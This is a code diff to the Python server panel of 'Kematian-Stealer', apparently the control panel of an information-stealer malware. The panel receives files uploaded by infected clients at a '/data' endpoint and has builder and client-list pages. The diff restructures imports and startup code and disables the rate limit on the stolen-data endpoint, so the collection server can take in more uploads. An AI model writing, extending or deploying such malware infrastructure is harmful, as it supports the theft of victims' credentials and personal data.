@@ -6,18 +6,18 @@ import subprocess
 
 import datetime
 
-from ui.modules.first_time.first_time import MakeFiles
-from ui.modules.notifications.notifications import Notifications
-from ui.modules.settings.settings import Settings
+from panel.ui.modules.first_time.first_time import MakeFiles
+from panel.ui.modules.notifications.notifications import Notifications
+from panel.ui.modules.settings.settings import Settings
 
-from ui.handlers.logs_handler import LogHandler
+from panel.ui.handlers.logs_handler import LogHandler
 
-from ui.pages.frames.main_frame import frame
+from panel.ui.pages.frames.main_frame import frame
 
-from ui.pages.index_page import fr_page
-from ui.pages.builder_page import builder
-from ui.pages.settings_page import settings_stuff
-from ui.pages.clients_page import clients_page_stuff
+from panel.ui.pages.index_page import fr_page
+from panel.ui.pages.builder_page import builder
+from panel.ui.pages.settings_page import settings_stuff
+from panel.ui.pages.clients_page import clients_page_stuff
 
 from slowapi import Limiter, _rate_limit_exceeded_handler
 from slowapi.util import get_remote_address
@@ -82,7 +82,7 @@ async def on_startup():
 
 
 @app.post("/data")
-@limiter.limit("1/hour", error_message="Only 1 request per hour allowed")
+# @limiter.limit("1/hour", error_message="Only 1 request per hour allowed")
 async def receive_data(request: Request, file: UploadFile = File(...)) -> JSONResponse:
     """Receive data from the client and store it in the database.
 
@@ -243,27 +243,9 @@ def settings() -> None:
 
 ui.run_with(app, title="Kematian-Stealer")
 
-if __name__ in {"__main__", "__mp_main__"}:
-    current_settings = Settings()
+current_settings = Settings()
 
-    if not os.path.exists(
-        os.path.join(good_dir, "Kematian-Stealer", "keyfile.pem")
-    ) or not os.path.exists(os.path.join(good_dir, "Kematian-Stealer", "certfile.pem")):
-        file_handler.fix_key_and_certs()
-
-    try:
-        uvicorn.run(
-            app,
-            host="127.0.0.1",
-            port=int(
-                current_settings.get_setting("port"),
-            ),
-            ssl_keyfile=os.path.join(good_dir, "Kematian-Stealer", "keyfile.pem"),
-            ssl_certfile=os.path.join(good_dir, "Kematian-Stealer", "certfile.pem"),
-        )
-        # ui.run(title="Kematian-Stealer", host="127.0.0.1", port=8000, reload=True)
-    except KeyboardInterrupt:
-        print("Exiting...")
-        exit(0)
-
-# USE TABLE FOR CLIENTS
+if not os.path.exists(
+    os.path.join(good_dir, "Kematian-Stealer", "keyfile.pem")
+) or not os.path.exists(os.path.join(good_dir, "Kematian-Stealer", "certfile.pem")):
+    file_handler.fix_key_and_certs()
